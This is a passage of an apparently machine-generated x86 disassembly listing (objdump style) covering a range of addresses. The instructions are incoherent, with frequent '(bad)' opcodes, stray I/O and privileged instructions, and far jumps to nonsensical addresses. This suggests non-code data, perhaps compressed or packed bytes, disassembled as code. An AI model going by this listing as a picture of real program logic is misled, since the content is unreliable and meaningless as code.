  421089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42108a:	cld    
  42108b:	fwait
  42108c:	sti    
  42108d:	shl    DWORD PTR ds:0x1d17,1
	...
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    fs,WORD PTR [eax+0x76]
  421102:	or     BYTE PTR [ebp+0x16098],0x5
  421109:	add    DWORD PTR [eax],eax
  42110b:	add    cl,cl
  42110d:	pop    ebx
  42110e:	test   eax,0xcd358a18
  421113:	loop   0x4210a2
  421115:	outs   dx,BYTE PTR ds:[esi]
  421116:	inc    edx
  421117:	or     eax,0x295fed12
  42111c:	jnp    0x421169
  42111e:	or     BYTE PTR [ebx],cl
  421120:	out    dx,eax
  421121:	and    bh,BYTE PTR [edi]
  421123:	dec    esi
  421124:	dec    ebx
  421125:	ss aam 0x34
  421128:	inc    esp
  421129:	int3   
  42112a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42112b:	xlat   BYTE PTR ds:[ebx]
  42112c:	and    edi,DWORD PTR [ebx+0x50]
  42112f:	add    ebp,esp
  421131:	push   ebx
  421132:	mov    bh,0xd1
  421134:	fdiv   QWORD PTR [ebx+0x2aae1922]
  42113a:	iret   
  42113b:	mov    esp,0xb20ee2b8
  421140:	clc    
  421141:	shl    esp,cl
  421143:	das    
  421144:	push   ds
  421145:	adc    DWORD PTR [ecx-0x6428c5c0],edi
  42114b:	xlat   BYTE PTR ds:[ebx]
  42114c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42114d:	idiv   DWORD PTR [eax]
  42114f:	fnstenv [eax]
  421151:	inc    esp
  421152:	pop    esi
  421153:	jne    0x4211b2
  421155:	sub    eax,0xa7d454ff
  42115a:	jmp    0x571d:0xc83834d0
  421161:	icebp  
  421162:	inc    eax
  421163:	adc    BYTE PTR [edx+0x42],bh
  421166:	inc    ebx
  421167:	inc    eax
  421168:	out    0xf1,eax
  42116a:	add    al,0x3b
  42116c:	ja     0x4211ad
  42116e:	aaa    
  42116f:	sub    BYTE PTR [esi+edi*2-0x3306e0e9],0x2
  421177:	jns    0x421183
  421179:	sub    BYTE PTR [ebp+0x2ce14a0e],ah
  42117f:	xchg   BYTE PTR cs:[edx],ch
  421182:	mul    DWORD PTR [eax]
  421184:	stos   BYTE PTR es:[edi],al
  421185:	(bad)  
  421186:	push   edx
  421187:	into   
  421188:	mov    cl,0x66
  42118a:	jmp    0x85ae7d98
  42118f:	mov    ah,BYTE PTR [eax-0x22]
  421192:	cmc    
  421193:	pop    eax
  421195:	inc    eax
  421196:	sub    al,BYTE PTR [eax+0x47]
  421199:	mov    bl,0xeb
  42119b:	scas   eax,DWORD PTR es:[edi]
  42119c:	xchg   esi,eax
  42119d:	mov    WORD PTR [eax-0x2c47a90b],?
  4211a3:	and    edi,ecx
  4211a5:	add    al,0xb7
  4211a7:	jmp    0x4b1ba3cd
  4211ac:	jo     0x4211a8
  4211ae:	mov    al,ds:0x2e3f0500
  4211b3:	pop    ss
  4211b4:	lahf   
  4211b5:	sbb    BYTE PTR [ebx-0x3f],cl
  4211b8:	adc    al,0xdc
  4211ba:	pushf  
  4211bb:	aas    
  4211bc:	sbb    DWORD PTR [edx+edi*8],ebp
  4211bf:	mov    al,0x10
  4211c1:	loope  0x421230
  4211c3:	xlat   BYTE PTR ds:[ebx]
  4211c4:	dec    esp
  4211c5:	pop    ebx
  4211c6:	int3   
  4211c7:	fst    st(5)
  4211c9:	dec    edx
  4211ca:	fcomp  st(6)
  4211cc:	or     ch,dl
  4211ce:	call   0xb862:0x36bf2992
  4211d5:	xor    eax,0x84c27660
  4211da:	mov    esi,0xa4839db8
  4211df:	stc    
  4211e0:	pop    edx
  4211e1:	or     cl,BYTE PTR [edi]
  4211e3:	mov    ebx,0x489dd29c
  4211e8:	cmp    BYTE PTR [edi+ecx*8+0x3d18bb8c],bl
  4211ef:	xchg   edx,eax
  4211f0:	dec    esi
  4211f1:	cmp    eax,0x430ba2ee
  4211f6:	sbb    eax,DWORD PTR [edi+0x49]
  4211f9:	scas   al,BYTE PTR es:[edi]
  4211fa:	stos   DWORD PTR es:[edi],eax
  4211fb:	in     eax,0x72
  4211fd:	sbb    eax,ebp
  4211ff:	cmp    esi,edx
  421201:	les    esp,FWORD PTR [esi+0x6d7662b2]
  421207:	dec    ecx
  421208:	fmul   DWORD PTR [edx+edi*4+0x6fe6c9bd]
  42120f:	(bad)  
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0x50d67ab3
  421282:	sar    BYTE PTR [esi+0x1619d],1
  421288:	add    eax,0x10000001
  42128d:	add    BYTE PTR [eax+0x685e1720],0x4b
  421294:	adc    eax,0xea9aea6d
  421299:	push   cs
  42129a:	in     al,dx
  42129b:	je     0x4212b0
  42129d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42129e:	mov    cl,0x6b
  4212a0:	cs mov ecx,0xfec7c2c5
  4212a6:	add    BYTE PTR [ebp+0x38],0x33
  4212aa:	sub    ebx,eax
  4212ac:	adc    BYTE PTR ds:0x464a8c2d,ah
  4212b2:	cmp    eax,0xe4138d6
  4212b7:	cmp    DWORD PTR [edi],eax
  4212b9:	xchg   edi,eax
  4212ba:	pop    ss
  4212bb:	ficomp WORD PTR [edx+0x30d2d487]
  4212c1:	imul   ecx,DWORD PTR [edi-0x11],0x64da2c21
  4212c8:	and    bl,dl
  4212ca:	hlt    
  4212cb:	sahf   
  4212cc:	inc    eax
  4212cd:	and    cl,BYTE PTR [ebx-0x22df38c7]
  4212d3:	outs   dx,BYTE PTR ds:[esi]
  4212d4:	rcl    BYTE PTR [ecx-0x433e8b6e],0x92
  4212db:	in     al,0x77
  4212dd:	pop    ebx
  4212de:	mov    DWORD PTR [ebx+0x7c],esp
  4212e1:	xchg   ecx,eax
  4212e2:	mov    ds:0xb5d3f440,eax
  4212e7:	adc    al,dh
  4212e9:	push   edx
  4212ea:	or     eax,0x80c58b49
  4212ef:	pop    ecx
  4212f0:	inc    eax
  4212f1:	pop    es
  4212f2:	or     al,0xe4
  4212f4:	addr16 xchg esi,eax
  4212f6:	cmp    ecx,esp
  4212f8:	mov    eax,0x9afb0451
  4212fd:	sbb    ah,BYTE PTR [edx-0xab0f346]
  421303:	sar    DWORD PTR [edx+0x4844b448],cl
  421309:	xchg   ebx,eax
  42130a:	pop    ebp
  42130b:	in     al,0xf0
  42130d:	mov    edi,0x3086bb62
  421312:	into   
  421313:	jb     0x4212a7
  421315:	aaa    
  421316:	or     eax,0x39089677
  42131b:	daa    
  42131c:	stos   DWORD PTR es:[edi],eax
  42131d:	out    dx,al
  42131e:	xchg   edi,eax
  42131f:	clc    
  421320:	out    0xd8,al
  421322:	ret    
  421323:	imul   edi,DWORD PTR [ebx],0x18
  421326:	mov    BYTE PTR [edi+0x3c948988],cl
  42132c:	ins    DWORD PTR es:[edi],dx
  42132d:	in     eax,0x3b
  42132f:	sub    BYTE PTR [ecx],dl
  421331:	cwde   
  421332:	pop    eax
  421333:	in     al,0xfb
  421335:	ja     0x4212d1
  421337:	aaa    
  421338:	and    al,0x88
  42133a:	mov    dl,0x3b
  42133c:	mov    bl,0xd0
  42133e:	cmp    ch,ah
  421340:	iret   
  421341:	mov    eax,ds:0x596544ad
  421346:	mov    al,0xf3
  421348:	push   0x45
  42134a:	lds    eax,FWORD PTR [ebp+0x68]
  42134d:	ja     0x42130a
  42134f:	call   0xbca2852c
  421354:	push   0xd9486a2c
  421359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42135a:	push   esi
  42135b:	pop    es
  42135c:	inc    esp
  42135d:	daa    
  42135e:	sub    al,0xfe
  421360:	outs   dx,DWORD PTR ds:[esi]
  421361:	lea    esp,[esi]
  421363:	jmp    0xe755a96f
  421368:	and    eax,0x1f060a41
  42136d:	sbb    DWORD PTR cs:[edx-0x40985a7],edi
  421374:	int    0x97
  421376:	dec    edx
  421377:	popa   
  421378:	sbb    eax,0x95e89b7a
  42137d:	les    eax,FWORD PTR [ebx+0x5d]
  421380:	in     al,dx
  421381:	fwait
  421382:	enter  0x5abc,0x93
  421386:	(bad)  
  421387:	shr    ah,cl
  421389:	mov    dl,0x55
  42138b:	leave  
  42138c:	(bad)  
  42138d:	rcl    DWORD PTR [ebp*2+0x51],1
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x1c260b61]
  421402:	mov    ch,0x11
  421404:	mov    ds:0x5000162,al
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    dh,al
  42140d:	lock mov bl,0xe8
  421410:	shl    dh,0xce
  421413:	mov    edi,edi
  421415:	scas   al,BYTE PTR es:[edi]
  421416:	xor    al,0x8b
  421418:	icebp  
  421419:	dec    esp
  42141a:	iret   
  42141b:	hlt    
  42141c:	loope  0x4213a2
  42141e:	rol    DWORD PTR [ecx+0x60],1
  421421:	mov    cs,WORD PTR [ebx-0x51]
  421424:	mov    gs,WORD PTR [ebp+0x3fa4dac8]
  42142a:	adc    eax,0xd31f650f
  42142f:	lock or edi,esi
  421432:	(bad)
  421435:	mov    al,0xc3
  421437:	pusha  
  421438:	xor    BYTE PTR [edi],ch
  42143a:	sbb    bh,BYTE PTR [eax+0x32]
  42143d:	out    0x57,eax
  42143f:	imul   esp,DWORD PTR [eax+0x3eef6c8a],0x35
  421446:	sahf   
  421447:	test   al,0x83
  421449:	ins    BYTE PTR es:[edi],dx
  42144a:	pop    eax
  42144b:	stos   DWORD PTR es:[edi],eax
  42144c:	pop    ebx
  42144d:	aas    
  42144e:	xchg   ecx,eax
  42144f:	fld    TBYTE PTR [ebx]
  421451:	cmp    eax,0xc9278732
  421456:	push   ss
  421457:	and    eax,0x475ca782
  42145c:	sbb    eax,0x8d9418b7
  421461:	and    DWORD PTR [eax+0x44],ecx
  421464:	push   es
  421465:	je     0x421430
  421467:	call   0xe0df:0x9617ba56
  42146e:	(bad)
  421471:	lods   al,BYTE PTR ds:[esi]
  421472:	push   edi
  421473:	adc    bh,BYTE PTR [ebx+0x45]
  421476:	sub    ecx,0x91edab6c
  42147c:	mov    eax,0x8a86804f
  421481:	adc    BYTE PTR [edx+0x24],cl
  421484:	sbb    BYTE PTR [ebp+0x61],dh
  421487:	or     eax,0xa46747a
  42148c:	dec    ecx
  42148d:	sub    bl,BYTE PTR [edx-0x44]
  421490:	sub    DWORD PTR [ebp-0x45],eax
  421493:	rcr    BYTE PTR [ebx-0x2bb10a9b],1
  421499:	data16 jns 0x42145d
  42149c:	and    BYTE PTR [edi+0x4f],ah
  42149f:	je     0x421435
  4214a1:	mov    edx,0x14406690
  4214a6:	cwde   
  4214a7:	inc    edx
  4214a8:	imul   ebx
  4214aa:	adc    BYTE PTR [ecx],0x57
  4214ad:	xchg   ecx,eax
  4214ae:	adc    bl,BYTE PTR [esi-0x64]
  4214b1:	popw   es
  4214b3:	mov    bl,0xc7
  4214b5:	jnp    0x421491
  4214b7:	xchg   ebx,eax
  4214b8:	aas    
  4214b9:	ja     0x4214ef
  4214bb:	retf   
  4214bc:	pop    eax
  4214bd:	fisub  WORD PTR [edx-0x20]
  4214c0:	and    ecx,DWORD PTR [edx+0x1]
  4214c3:	int    0xbe
  4214c5:	push   ss
  4214c6:	cld    
  4214c7:	mov    bl,0xd7
  4214c9:	push   esp
  4214ca:	fldcw  WORD PTR [edi]
  4214cc:	mov    ebx,0x2fd91799
  4214d1:	mov    esp,0xd0b49ed
  4214d6:	dec    ecx
  4214d7:	(bad)  
  4214d8:	mov    esp,DWORD PTR [eax+ebp*2]
  4214db:	loopne 0x421541
  4214dd:	xchg   DWORD PTR [ebp-0x7b47f651],edx
  4214e3:	cmp    cl,dh
  4214e5:	push   0x3abaf3f4
  4214ea:	sbb    ebx,ebp
  4214ec:	dec    ecx
  4214ed:	xor    cl,BYTE PTR [ebx-0x4a]
  4214f0:	cmp    ah,BYTE PTR [ecx+0x182c0be6]
  4214f6:	jmp    0x4214ac
  4214f8:	jns    0x4214f1
  4214fa:	push   ss
  4214fb:	jge    0x421579
  4214fd:	xlat   BYTE PTR ds:[ebx]
  4214fe:	call   0x6021c7ab
  421503:	dec    esp
  421504:	xchg   edx,eax
  421505:	cli    
  421506:	mov    bl,BYTE PTR [edi-0x44]
  421509:	outs   dx,DWORD PTR ds:[esi]
  42150a:	(bad)  
  42150b:	ja     0x42148d
  42150d:	cmp    al,0x9a
  42150f:	fimul  WORD PTR [esi+0x0]
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x7b5fbd4c],bp
  421582:	iret   
  421583:	loope  0x42152c
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0x95000001,al
  42158d:	inc    BYTE PTR [eax-0x79]
  421590:	dec    ebx
  421591:	lock mov eax,0x4290048f
  421597:	ret    0x7429
  42159a:	fcmovnu st,st(0)
  42159c:	nop
  42159d:	rcr    DWORD PTR [ebp-0x71],cl
  4215a0:	fs mov cl,0x90
  4215a3:	sub    eax,0x8e4a821
  4215a8:	mov    al,ds:0xd637a91
  4215ad:	mov    ebx,0x3ff8a3c8
  4215b2:	jns    0x421580
  4215b4:	lock imul ecx,DWORD PTR ss:[ebx],0x120e5129
  4215bc:	sub    DWORD PTR [ebx+0x37],edi
  4215bf:	xor    al,0x64
  4215c1:	stos   BYTE PTR es:[edi],al
  4215c2:	mov    edx,0x8106c0
  4215c7:	mov    edi,0x670bf4f9
  4215cc:	adc    bh,ah
  4215ce:	cli    
  4215cf:	xchg   esi,eax
  4215d0:	adc    ch,BYTE PTR [edi]
  4215d2:	sbb    cl,bl
  4215d4:	mov    dh,0x1a
  4215d6:	call   0xc489:0x509a4b0c
  4215dd:	js     0x4215f6
  4215df:	mov    esp,0xe3e5a233
  4215e4:	cld    
  4215e5:	aaa    
  4215e6:	fdiv   DWORD PTR [eax-0x795affe5]
  4215ec:	jbe    0x4215d4
  4215ee:	xor    ecx,DWORD PTR [ebp+0x348acbcc]
  4215f4:	sbb    ah,BYTE PTR [eax]
  4215f6:	popa   
  4215f7:	fwait
  4215f8:	sahf   
  4215f9:	add    DWORD PTR [ecx+0x26],edi
  4215fc:	mov    ebx,0x7cae42a4
  421601:	imul   edi,DWORD PTR [edi-0x2b],0xbaa892b8
  421608:	pop    ds
  421609:	mov    al,0x56
  42160b:	jne    0x421616
  42160d:	jg     0x4215f2
  42160f:	in     al,0xb4
  421611:	fldenv [eax]
  421613:	loop   0x421648
  421615:	xchg   ecx,eax
  421616:	sub    DWORD PTR [esi-0x121d9663],esi
  42161c:	and    edi,esp
  42161e:	fist   WORD PTR [ebp+edi*1-0x34]
  421622:	mov    ecx,0xe3736921
  421627:	aad    0x26
  421629:	in     al,0xa7
  42162b:	hlt    
  42162c:	pop    edx
  42162d:	xor    BYTE PTR [eax],bh
  42162f:	mov    dl,0x37
  421631:	mov    ah,0x19
  421633:	pushf  
  421634:	jns    0x421698
  421636:	aas    
  421637:	adc    edi,DWORD PTR [edx]
  421639:	inc    ecx
  42163a:	and    ah,cl
  42163c:	mov    ebp,0x2a165c08
  421641:	jp     0x421695
  421643:	and    edx,DWORD PTR [ebp-0x717a3f46]
  421649:	icebp  
  42164a:	push   0xffffffed
  42164c:	out    0x4e,eax
  42164e:	test   DWORD PTR [ebp+0x42bd492a],eax
  421654:	push   cs
  421655:	int    0xb7
  421657:	push   cs
  421658:	or     ebx,ecx
  42165a:	adc    dh,BYTE PTR [eax+esi*4]
  42165d:	in     ax,0x78
  421660:	sbb    DWORD PTR ds:0x306e1fa5,esp
  421666:	lock jl 0x421691
  421669:	mov    edi,0xd44d1b84
  42166e:	aaa    
  42166f:	(bad)  
  421670:	repnz pop ds
  421672:	sbb    DWORD PTR [ebx],eax
  421674:	mov    ebp,0x524d15d5
  421679:	hlt    
  42167a:	inc    ecx
  42167b:	popf   
  42167c:	inc    ecx
  42167d:	scas   al,BYTE PTR es:[edi]
  42167e:	test   al,0x33
  421680:	imul   edi,esp,0xde5985b5
  421686:	dec    ecx
  421687:	mov    edi,0x9bab5d73
  42168c:	in     eax,0xf1
  42168e:	cmp    DWORD PTR [edx+eax*2+0x0],edx
	...
  4216f1:	add    BYTE PTR [eax],al
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	mov    BYTE PTR gs:[esi+0x27],ah
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0x40000001
  42170d:	pusha  
  42170e:	cmp    eax,0xf1f516b1
  421713:	sub    DWORD PTR [edi-0x2e],0x7d
  421717:	xor    al,0xf8
  421719:	fcomp  DWORD PTR [edx]
  42171b:	ficom  WORD PTR [esi-0x47]
  42171e:	les    eax,FWORD PTR [eax-0x4380406b]
  421724:	cmp    dh,BYTE PTR [ebx-0x594b5be2]
  42172a:	pop    ss
  42172b:	div    DWORD PTR cs:[ecx]
  42172e:	lock pop ebp
  421730:	xlat   BYTE PTR ds:[ebx]
  421731:	and    eax,0x4f000af6
  421736:	or     ah,BYTE PTR [esi+edx*2-0x6b2a08b6]
  42173d:	mov    esp,0xf31f7f76
  421742:	push   ds
  421743:	or     al,0x88
  421745:	shl    DWORD PTR [ebx+0x5f],cl
  421748:	mov    eax,ds:0x3c03aa65
  42174d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42174e:	fdivr  DWORD PTR [ecx-0x3]
  421751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421752:	sbb    ah,BYTE PTR [esi-0x50d4a98b]
  421758:	fisubr WORD PTR [eax-0xe86a1db]
  42175e:	int    0xdc
  421760:	sub    BYTE PTR [edx-0x8],dl
  421763:	xchg   edx,eax
  421764:	loop   0x4216fc
  421766:	xchg   ebx,eax
  421767:	xor    eax,0x320f1435
  42176c:	mov    cl,0x47
  42176e:	and    DWORD PTR [ebx+0x69bb2c3],ebx
  421774:	push   esi
  421775:	ins    BYTE PTR es:[edi],dx
  421776:	pop    ebp
  421777:	addr16 ja 0x421714
  42177a:	popf   
  42177b:	retf   
  42177c:	ins    BYTE PTR es:[edi],dx
  42177d:	or     al,0x81
  42177f:	int    0x52
  421781:	inc    edi
  421782:	fwait
  421783:	pop    ds
  421784:	mov    ds:0x9661d079,al
  421789:	jmp    0xbcb3:0x773f4750
  421790:	ins    BYTE PTR es:[edi],dx
  421791:	pop    ebp
  421792:	outs   dx,DWORD PTR ds:[esi]
  421793:	add    BYTE PTR [edi+0x300ac2ca],bh
  421799:	mul    BYTE PTR [edx+0x6fcc718b]
  42179f:	ds cs pushf 
  4217a2:	and    BYTE PTR [esi-0x12f447c6],0xb2
  4217a9:	or     cl,cl
  4217ab:	sub    eax,0x20fbc459
  4217b0:	push   ecx
  4217b1:	jle    0x4217e8
  4217b3:	test   bl,bl
  4217b5:	aaa    
  4217b6:	push   edx
  4217b7:	cmc    
  4217b8:	daa    
  4217b9:	cwde   
  4217ba:	jmp    0x4217f0
  4217bc:	fwait
  4217bd:	shl    DWORD PTR [ebx-0x22],cl
  4217c0:	xlat   BYTE PTR ds:[ebx]
  4217c1:	and    DWORD PTR [esi],0xa1c1929c
  4217c7:	lahf   
  4217c8:	ret    
  4217c9:	sbb    DWORD PTR [ebx+0x6],edx
  4217cc:	dec    esi
  4217cd:	mov    ah,0x95
  4217cf:	mov    edi,0x486a3e2
  4217d4:	mov    ds:0xb98e6673,eax
  4217d9:	les    ebx,FWORD PTR [eax+edi*1]
  4217dc:	imul   eax,DWORD PTR [ebx+0x6248ae7c],0xffffff83
  4217e3:	shl    DWORD PTR [ecx],cl
  4217e5:	jne    0x421837
  4217e7:	imul   edi,DWORD PTR [ecx-0x72a755b],0x410b8f38
  4217f1:	sbb    ebx,ecx
  4217f3:	popa   
  4217f4:	in     eax,0x27
  4217f6:	lock dec edx
  4217f8:	dec    BYTE PTR [ecx-0x91d6ce5]
  4217fe:	icebp  
  4217ff:	inc    esp
  421800:	mov    bl,0xaf
  421802:	ins    BYTE PTR es:[edi],dx
  421803:	adc    ebp,DWORD PTR [esi]
  421805:	xor    esi,DWORD PTR [esi-0x5773382b]
  42180b:	sbb    BYTE PTR [ebx-0x1d],dh
  42180e:	sti    
  42180f:	pop    ecx
  421810:	cli    
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	mov    edi,0xb14f4c8f
  421885:	add    DWORD PTR gs:[eax],eax
  421888:	add    eax,0x90000001
  42188d:	xor    cl,dh
  42188f:	add    BYTE PTR [edx],0x5
  421892:	std    
  421893:	pop    esp
  421894:	enter  0xa5ba,0x35
  421898:	out    dx,al
  421899:	or     ch,BYTE PTR [esi]
  42189b:	ins    BYTE PTR es:[edi],dx
  42189c:	jns    0x4218c3
  42189e:	sub    al,0xa3
  4218a0:	inc    edx
  4218a1:	ins    DWORD PTR es:[edi],dx
  4218a2:	mov    ah,0x24
  4218a4:	not    BYTE PTR [eax]
  4218a6:	and    al,0xc6
  4218a8:	jg     0x42186b
  4218aa:	jne    0x4218fd
  4218ac:	popa   
  4218ad:	cmp    edi,eax
  4218af:	dec    ebp
  4218b0:	push   cs
  4218b1:	sbb    al,0x1
  4218b3:	out    dx,al
  4218b4:	cli    
  4218b5:	int    0x5
  4218b7:	popf   
  4218b8:	bound  ebp,QWORD PTR [eax]
  4218ba:	and    ecx,DWORD PTR [edi-0x489180c2]
  4218c0:	or     ah,BYTE PTR [edx+esi*8-0x74]
  4218c4:	mov    dh,0x2f
  4218c6:	out    0xd0,al
  4218c8:	cmp    BYTE PTR [edi+0x4],bl
  4218cb:	les    eax,FWORD PTR es:[esi]
  4218ce:	mov    WORD PTR ds:0x2fbb4a38,?
  4218d4:	push   es
  4218d5:	dec    edx
  4218d6:	lods   al,BYTE PTR ds:[esi]
  4218d7:	aas    
  4218d8:	inc    esi
  4218d9:	pop    ss
  4218da:	pop    ecx
  4218db:	xor    esi,edx
  4218dd:	leave  
  4218de:	cmp    ebx,esp
  4218e0:	je     0x421932
  4218e2:	sbb    DWORD PTR [esi],eax
  4218e4:	loope  0x4218b5
  4218e6:	repnz rcr DWORD PTR [ebx+0x49842bb6],1
  4218ed:	fwait
  4218ee:	mov    bl,0x48
  4218f0:	and    ah,0x70
  4218f3:	mov    cl,0xd2
  4218f5:	dec    esp
  4218f6:	mov    ch,0x16
  4218f8:	xor    ecx,edi
  4218fa:	adc    esp,esi
  4218fc:	mov    bh,0x8d
  4218fe:	xor    BYTE PTR [esi],cl
  421900:	(bad)  
  421901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421902:	jg     0x42190c
  421904:	add    BYTE PTR [ebx+0x253387fd],dl
  42190a:	stos   DWORD PTR es:[edi],eax
  42190b:	add    dl,BYTE PTR [edx-0x21]
  42190e:	add    BYTE PTR [esp+esi*2+0x2f581b13],0x73
  421916:	scas   eax,DWORD PTR es:[edi]
  421917:	popf   
  421918:	and    eax,0xff6b20cc
  42191d:	pusha  
  42191e:	xor    eax,0x74428fa4
  421923:	scas   al,BYTE PTR es:[edi]
  421924:	mov    ecx,0xcebe8978
  421929:	adc    BYTE PTR gs:[ecx-0x1e059fd4],al
  421930:	hlt    
  421931:	mov    edx,0xd8d207de
  421936:	das    
  421937:	pop    eax
  421938:	xchg   DWORD PTR [edx],esi
  42193a:	push   edi
  42193b:	sbb    al,0xfe
  42193d:	and    eax,DWORD PTR [esi+0x5d]
  421940:	test   al,0xd
  421942:	inc    eax
  421943:	add    al,0x8d
  421945:	mov    dl,0xae
  421947:	shl    DWORD PTR [ebp+0x20590da1],1
  42194d:	xor    edi,0xb3a0936c
  421953:	and    DWORD PTR cs:[esi+0x47640014],ebp
  42195a:	pop    eax
  42195b:	or     al,0xc
  42195d:	or     DWORD PTR [edx+0x42],esi
  421960:	dec    BYTE PTR [edx]
  421962:	icebp  
  421963:	lahf   
  421964:	mov    ebp,0x2ceba8dc
  42196a:	outs   dx,BYTE PTR ds:[esi]
  42196b:	pop    es
  42196c:	mov    al,0xab
  42196e:	shl    BYTE PTR ds:0x672f04b7,1
  421974:	out    dx,eax
  421975:	mov    ebx,0xc1236422
  42197a:	leave  
  42197b:	add    al,0xbc
  42197d:	in     eax,0x5b
  42197f:	sbb    ebp,DWORD PTR [ebx]
  421981:	push   ebx
  421982:	push   ebp
  421983:	push   esp
  421984:	lea    ebx,[eax+0x63]
  421987:	(bad)  
  421988:	or     eax,0x3accee03
  42198d:	das    
  42198e:	mov    eax,0x7e08
	...
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	sbb    DWORD PTR [ebx+eax*4],edx
  421a03:	call   0x4380be
  421a08:	add    eax,0x17000001
  421a0d:	xchg   ebp,eax
  421a0e:	cld    
  421a0f:	and    eax,0xd08344ba
  421a14:	xchg   ebp,eax
  421a15:	sub    BYTE PTR [edi-0x9],ch
  421a18:	repz xchg ebp,eax
  421a1a:	mov    al,0x23
  421a1c:	mov    dh,BYTE PTR [ebx+eiz*2-0x3d71b9b3]
  421a23:	jo     0x4219e8
  421a25:	pop    ecx
  421a26:	mov    esi,0xa38ffb7d
  421a2b:	js     0x4219c7
  421a2d:	cmp    eax,0x74c7a1d7
  421a32:	addr16 or al,0x6c
  421a35:	arpl   WORD PTR [ebx+0x593e5a46],ax
  421a3b:	mov    WORD PTR [esi+eax*2+0x16],gs
  421a3f:	push   esp
  421a40:	mov    edx,0xb507cbc0
  421a45:	imul   eax,DWORD PTR [eax],0x1c
  421a48:	jmp    0x421a18
  421a4a:	setle  BYTE PTR [ebx-0x75d204e8]
  421a51:	adc    ch,BYTE PTR [ebx-0x4e3a1b23]
  421a57:	leave  
  421a58:	mov    edi,0x8e0411ad
  421a5d:	inc    ebx
  421a5e:	mov    ds:0xa7bc9bbf,al
  421a63:	mov    ch,0xd5
  421a65:	fld    TBYTE PTR [ecx-0x33]
  421a68:	sti    
  421a69:	inc    esi
  421a6a:	je     0x421a20
  421a6c:	(bad)  
  421a6d:	cs sub bl,cl
  421a70:	mov    ecx,0xeff682de
  421a75:	mov    bh,0xb3
  421a77:	xchg   ebx,eax
  421a78:	mov    ch,0x50
  421a7a:	out    0xd5,eax
  421a7c:	xor    ah,BYTE PTR [esi+0x51e53158]
  421a82:	or     ecx,DWORD PTR [edi+0x4ac9cbda]
  421a88:	mov    esi,DWORD PTR [ebx-0x3ec1b9c3]
  421a8e:	into   
  421a8f:	(bad)
  421a92:	mov    eax,0xd5390837
  421a97:	fsubrp st(3),st
  421a99:	mov    eax,ds:0x690fb266
  421a9e:	cli    
  421a9f:	mov    bl,0x79
  421aa1:	inc    edx
  421aa2:	mov    eax,0xcba1ad1f
  421aa7:	rol    BYTE PTR [eax],0xfa
  421aaa:	dec    esp
  421aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aac:	and    al,0x15
  421aae:	pop    ds
  421aaf:	gs push ss
  421ab1:	add    BYTE PTR [ebx],ah
  421ab3:	pop    ebp
  421ab4:	pop    edx
  421ab5:	lods   al,BYTE PTR ds:[esi]
  421ab6:	lods   al,BYTE PTR ds:[esi]
  421ab7:	jl     0x421aa6
  421ab9:	or     eax,0x249422f6
  421abe:	xor    edx,DWORD PTR [ebx+0x6]
  421ac1:	imul   DWORD PTR [esi-0x5d7bee61]
  421ac7:	scas   al,BYTE PTR es:[edi]
  421ac8:	push   ss
  421ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aca:	cmovs  eax,DWORD PTR [eax]
  421acd:	ja     0x421b1c
  421acf:	add    esp,DWORD PTR [ecx]
  421ad1:	out    dx,eax
  421ad2:	sbb    al,0xaa
  421ad4:	sub    al,0x7e
  421ad6:	pop    es
  421ad7:	jmp    0xdea791bf
  421adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421add:	test   BYTE PTR [esi],bh
  421adf:	mov    bh,0xcf
  421ae1:	adc    BYTE PTR [ebx*4+0x765b1c3b],bl
  421ae8:	leave  
  421ae9:	or     dl,BYTE PTR [ebp+0x35817cfc]
  421aef:	push   eax
  421af0:	jno    0x421aa4
  421af2:	icebp  
  421af3:	retf   0x1f61
  421af6:	xchg   ebp,eax
  421af7:	push   eax
  421af8:	pop    ss
  421af9:	push   ecx
  421afa:	ficomp DWORD PTR [edx+0x18]
  421afd:	pop    ecx
  421afe:	cmc    
  421aff:	stos   BYTE PTR es:[edi],al
  421b00:	jmp    0x421ae9
  421b02:	inc    esp
  421b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b04:	xor    al,0xa7
  421b06:	ins    BYTE PTR es:[edi],dx
  421b07:	ins    BYTE PTR es:[edi],dx
  421b08:	lods   eax,DWORD PTR fs:[esi]
  421b0a:	push   0x694fc129
  421b0f:	sti    
  421b10:	adc    eax,0x0
	...
  421b71:	add    BYTE PTR [eax],al
